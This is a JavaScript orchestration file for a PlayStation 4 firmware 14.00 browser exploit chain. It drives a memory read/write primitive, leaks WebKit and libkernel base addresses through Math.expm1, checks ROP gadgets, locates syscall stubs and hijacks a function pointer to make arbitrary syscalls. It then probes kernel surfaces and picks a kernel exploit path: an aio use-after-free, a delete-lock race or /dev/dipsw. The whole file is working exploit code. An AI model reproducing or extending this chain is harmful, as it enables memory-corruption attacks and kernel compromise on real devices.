// boot.js -- the run order for the 14.00 probe, and nothing else.
//
//   chain(base) -> establishPrimitive -> installWindowP -> bases
//     -> gadget gate -> stub discovery -> gateway -> runProbes -> disarm
//
// Every stage finishes before the next one touches memory, and every stage has
// a name, so the results page can say exactly which one stopped instead of
// showing a stack trace from the middle of a ROP chain.
//
// The chain files are the fork's, not ours, so they are imported at run time
// from `base`: point ?base= at wherever core.js / mem.js / int64.js /
// ps4_offsets.js actually live. Default is the directory above probe/, which is
// where raw14g puts jb.html and expects the chain to be dropped.

import { runProbes, PROBE_SYSCALLS } from "./probes1400.js";
import {
  verifyGadgets,
  gadgetReportText,
  discoverStubs,
  buildCaller,
  looksAligned,
  hex,
} from "./fcall.js";

const LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|OK|STOP/i;

// Same UA rule as gate.js and ps4_offsets.js: the minor is two hex digits, so
// 13.52 is 0x52 and 14.00 is 0x00.
export function fwKeyFromUA(ua) {
  const m = /PlayStation\s+4[\/ ](\d+)\.(\d+)/.exec(ua || "");
  if (!m) return null;
  let minor = parseInt(m[2], 16).toString(16);
  if (minor.length < 2) minor = "0" + minor;
  return parseInt(m[1], 10) + "." + minor;
}

// ps4_offsets.js exposes offsetsFor(ua) -> {key, off}; fwtable.js exposes
// offsetsFor(key) -> entry. Accept both so the probe does not care which host
// it is dropped into.
export function resolveEntry(mod, ua, forcedKey) {
  const key = forcedKey || fwKeyFromUA(ua);
  if (!key) return { key: null, off: null, why: "not a PlayStation 4 UA" };

  if (!forcedKey && mod && typeof mod.offsetsFor === "function") {
    const r = mod.offsetsFor(ua);
    if (r && r.off) return { key: r.key || key, off: r.off, why: null };
    if (r && typeof r === "object" && typeof r.wk_expm1_builtin === "number")
      return { key: key, off: r, why: null };
  }

  if (mod && mod.PS4 && mod.PS4[key])
    return { key: key, off: mod.PS4[key], why: null };

  return { key: key, off: null, why: "no table entry for " + key };
}

// The two anchors the whole chain hangs off:
//   Math.expm1's JSFunction -> its native function pointer -> minus the
//   module RVA of expm1 = WebKit base; the __error import slot inside that
//   module -> minus the kernel RVA of __error = libkernel base.
// Both are reported even when they look wrong, because a wrong anchor and a
// moved module produce the same useless address and only the numbers tell them
// apart.
export function basesFrom(p, off) {
  const cell = p.leakval(Math.expm1);
  const jsCell = p.read8(cell.add32(0x18));
  const nativeFn = p.read8(jsCell.add32(off.wk_JSFunction_m_function));
  const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
  const errorSlot = p.read8(webkitBase.add32(off.wk___imp___error));
  const libkernelBase = errorSlot.sub32(off.k__error);

  return {
    cell: cell,
    nativeFn: nativeFn,
    webkitBase: webkitBase,
    errorSlot: errorSlot,
    libkernelBase: libkernelBase,
    ok: looksAligned(webkitBase) && looksAligned(libkernelBase),
    text:
      "webkit=" +
      hex(webkitBase) +
      " libkernel=" +
      hex(libkernelBase) +
      (looksAligned(webkitBase) && looksAligned(libkernelBase)
        ? ""
        : "  NOT 0x4000-aligned -- anchor or table is wrong"),
  };
}

// The probe table says what is open; this says what to do about it. Kept here
// rather than in the page so the rule is testable and appears in one place.
export function decide(results) {
  const verdict = function (name) {
    const r = (results || []).find(function (x) {
      return x.name === name;
    });
    return r ? r.verdict : "MISSING";
  };

  const wait = verdict("AIO-WAIT");
  const del = verdict("AIO-DELETE");
  const poll = verdict("AIO-POLL");
  const dipsw = verdict("DIPSW-IOCTL");
  const kbase = verdict("KBASE");

  const tail = "aio wait=" + wait + " delete=" + del + " poll=" + poll +
    " dipsw=" + dipsw + " kbase=" + kbase;

  if (wait === "SLEEPS")
    return {
      code: "lapse",
      tone: "good",
      headline: "WAIT SLEEPS -- the Lapse-family door is live",
      body: "Stop reading and port the public Lapse chain; nothing else here matters. " + tail,
    };

  if (wait === "GATED" && del === "ALIVE")
    return {
      code: "delete-toctou",
      tone: "good",
      headline: "WAIT GATED / DELETE ALIVE -- take the delete lock-upgrade",
      body: "The waiter is not built, so the aio-wait UAF cannot land. The only aio primitive left is the lock-upgrade window inside sys_aio_multi_delete, raced from a worker thread. " + tail,
    };

  if (wait === "GATED" && del !== "ALIVE")
    return {
      code: "dipsw",
      tone: "warn",
      headline: "AIO FAMILY CLOSED -- dipsw becomes the lead",
      body: "Both aio doors refused. /dev/dipsw is the only measured-open surface: one command per session, never a sweep. " + tail,
    };

  if (wait === "AMBIGUOUS")
    return {
      code: "ambiguous",
      tone: "warn",
      headline: "WAIT AMBIGUOUS -- re-run before concluding",
      body: "5-40 ms is scheduling noise, not a verdict. Run again on a quiet console before choosing a door. " + tail,
    };

  if (wait === "CLOSED" || wait === "UNKNOWN")
    return {
      code: "submit-closed",
      tone: "bad",
      headline: "SUBMIT REFUSED -- the aio queue itself is shut",
      body: "aio_submit_cmd did not produce ids, so no aio probe below it means anything. Re-check the submit format (4097 / op 3 / 40-byte requests) before trusting this map. " + tail,
    };

  return {
    code: "inconclusive",
    tone: "bad",
    headline: "NO VERDICT -- the run did not reach the door map",
    body: "Baseline or gateway failed. Fix that stage first; the probe results below are absent, not negative. " + tail,
  };
}

function stageError(stage, message, extra) {
  const e = new Error(message);
  e.stage = stage;
  if (extra) Object.assign(e, extra);
  return e;
}

export async function boot(options) {
  const o = options || {};
  const base = o.base || "../";
  const q = o.v ? "?v=" + encodeURIComponent(o.v) : "";
  const emit = typeof o.mark === "function" ? o.mark : function () {};
  const log = [];
  const started = Date.now();

  let stage = "import";
  let gate = null;
  let stubs = null;
  let bases = null;
  let results = null;
  let calls = null;
  let gatewayPid = null;

  function note(tag, detail) {
    const entry = {
      t: tag,
      d: detail === undefined ? "" : String(detail),
      ms: Date.now() - started,
    };
    log.push(entry);
    try {
      emit(tag, entry.d, entry.ms);
    } catch (e) {
      /* a broken UI must not stop the run */
    }
  }

  function trace(tag, detail) {
    if (o.verbose || LOUD.test(tag)) note(tag, detail);
  }

  try {
    // -- chain ------------------------------------------------------------
    stage = "import";
    const core = await import(base + "core.js" + q);
    const mem = await import(base + "mem.js" + q);
    const i64 = await import(base + "int64.js" + q);
    const offmod = await import(base + "ps4_offsets.js" + q);
    if (typeof core.establishPrimitive !== "function")
      throw stageError("import", base + "core.js does not export establishPrimitive");
    if (typeof mem.installWindowP !== "function")
      throw stageError("import", base + "mem.js does not export installWindowP");
    note("CHAIN", "base=" + base + (o.v ? " v=" + o.v : ""));

    // Optional: the fork's kernel table carries the kbase anchor at P[12].
    let tables = null;
    try {
      tables = await import(base + "hx_tables.js" + q);
      tables = tables.HX1400_TABLES || tables.default || tables;
    } catch (e) {
      tables = null;
    }
    const anchor =
      o.anchor != null
        ? o.anchor
        : tables && tables.P && typeof tables.P[12] === "number"
          ? tables.P[12]
          : 0;
    if (anchor) note("ANCHOR", hex(anchor));
    else note("ANCHOR", "absent -- kbase derivation will report UNRESOLVED");

    // -- firmware ---------------------------------------------------------
    stage = "firmware";
    const pick = resolveEntry(offmod, navigator.userAgent, o.fw);
    if (!pick.off) throw stageError("firmware", pick.why + " (" + pick.key + ")");
    const off = pick.off;
    note(
      "FW",
      pick.key + (o.fw ? " (forced)" : "") + "  " + (off.fw_status || "no fw_status"),
    );
    for (const needKey of ["wk_expm1_builtin", "wk_JSFunction_m_function", "wk___imp___error", "k__error", "pivot_view_sp"]) {
      if (typeof off[needKey] !== "number")
        throw stageError("firmware", "table has no " + needKey + " for " + pick.key);
    }

    // -- primitive --------------------------------------------------------
    stage = "primitive";
    note("PRIMITIVE", "starting (this is the slow one)");
    const carrier = await core.establishPrimitive({
      maxAttempts: o.maxAttempts || 6,
      onEvent: function (t, d, a) {
        trace(t, (a != null ? "[" + a + "] " : "") + (d || ""));
      },
    });

    stage = "window.p";
    mem.installWindowP(carrier, { promote: false });
    const p = globalThis.p;
    if (!p) throw stageError("window.p", "window.p was not installed");
    note("PRIMITIVE-OK", "window.p live, promotion off (buffers stay pinned)");

    // -- bases ------------------------------------------------------------
    stage = "bases";
    bases = basesFrom(p, off);
    note("BASES", bases.text);
    if (!bases.ok)
      throw stageError("bases", "module bases failed the alignment gate: " + bases.text);

    // -- gadgets ----------------------------------------------------------
    stage = "gadgets";
    gate = verifyGadgets(p, off, bases.webkitBase);
    note("GADGETS", gadgetReportText(gate));
    for (const w of gate.warnings) note("GADGET-NOTE", w);
    for (const b of gate.bad)
      note(
        "GADGET-BAD",
        b.name + " rva=" + hex(b.rva) +
          (b.reason ? " " + b.reason : " byte " + b.at + " want=" + b.want[b.at] + " got=" + b.got[b.at]),
      );
    if (!gate.ok && !o.allowPartialGadgets)
      throw stageError(
        "gadgets",
        "gadget gate " + gate.gated + "/" + gate.total + " -- a partial table cannot build a call gate",
      );

    // -- stubs ------------------------------------------------------------
    stage = "stubs";
    stubs = discoverStubs(p, off, bases.libkernelBase, PROBE_SYSCALLS, {
      fallback: o.allowFallbackStubs !== false,
      maxReads: o.maxScanReads,
    });
    note("STUBS", stubs.text);
    if (stubs.declaredStage1 !== null && stubs.fallbackUsed)
      note(
        "STUBS-NOTE",
        "table declared " + hex(stubs.declaredStage1) + " but stubs live past it -- the inherited bound is wrong for this build",
      );
    for (const s of stubs.badSeeds)
      note("STUB-SEED-BAD", "num=" + s.num + " rva=" + hex(s.rva) + " saw=" + (s.seen === undefined ? s.reason : s.seen));
    if (!stubs.ok)
      note("STUBS-PARTIAL", stubs.missing.length + " syscall(s) have no stub; those probes will throw and be recorded as such");

    // -- gateway ----------------------------------------------------------
    stage = "gateway";
    calls = buildCaller({
      p: p,
      off: off,
      int64: i64.int64,
      keepAlive: [],
      gadgets: gate.addr,
      stubs: stubs.found,
      errorFn: bases.errorSlot,
      cell: bases.cell,
    });
    try {
      gatewayPid = calls.sc(20).i32;
      note("GATEWAY", "getpid=" + gatewayPid);
    } catch (e) {
      note("GATEWAY", "getpid threw: " + ((e && e.message) || e));
    }

    // -- probes -----------------------------------------------------------
    stage = "probes";
    results = await runProbes({
      sc: calls.sc,
      bufAddr: calls.bufAddr,
      keepAlive: [],
      mark: function (tag, detail) {
        note(tag, detail);
      },
      errno: calls.errno,
      anchorRva: anchor,
      allowDeviceProbe: !!o.allowDeviceProbe,
    });

    stage = "done";
    const decision = decide(results);
    note("DECISION", decision.headline);

    return {
      ok: true,
      stage: stage,
      partial: !stubs.ok || !gate.ok,
      log: log,
      gate: gate,
      stubs: stubs,
      bases: bases,
      results: results,
      decision: decision,
      gatewayPid: gatewayPid,
      report: {
        firmware: pick.key,
        base: base,
        gatewayPid: gatewayPid,
        gadgets: gate.gated + "/" + gate.total,
        stubs: {
          ok: stubs.ok,
          seeded: stubs.seeded,
          scanned: stubs.scanned,
          fallback: stubs.fallbackScanned,
          missing: stubs.missing,
          stopped: stubs.stopped,
          window: stubs.window,
        },
        bases: {
          webkit: hex(bases.webkitBase),
          libkernel: hex(bases.libkernelBase),
        },
        results: results,
        decision: decision,
      },
    };
  } catch (e) {
    const message = (e && e.message) || String(e);
    note("BOOT-FAIL", stage + ": " + message);
    return {
      ok: false,
      stage: (e && e.stage) || stage,
      error: message,
      partial: true,
      log: log,
      gate: gate,
      stubs: stubs,
      bases: bases,
      results: results,
      decision: decide(results || []),
      report: {
        base: base,
        failedStage: (e && e.stage) || stage,
        error: message,
        gadgets: gate ? gate.gated + "/" + gate.total : null,
        stubs: stubs
          ? { ok: stubs.ok, missing: stubs.missing, stopped: stubs.stopped }
          : null,
        bases: bases ? { webkit: hex(bases.webkitBase), libkernel: hex(bases.libkernelBase) } : null,
        results: results,
      },
    };
  } finally {
    // The borrowed m_function goes back whether or not the run succeeded: a page
    // left armed turns the next Math.expm1 in any script into a jump.
    if (calls) {
      try {
        calls.disarm();
        note("DISARM", "Math.expm1 restored");
      } catch (e) {
        note("DISARM-FAIL", (e && e.message) || String(e));
      }
    }
  }
}
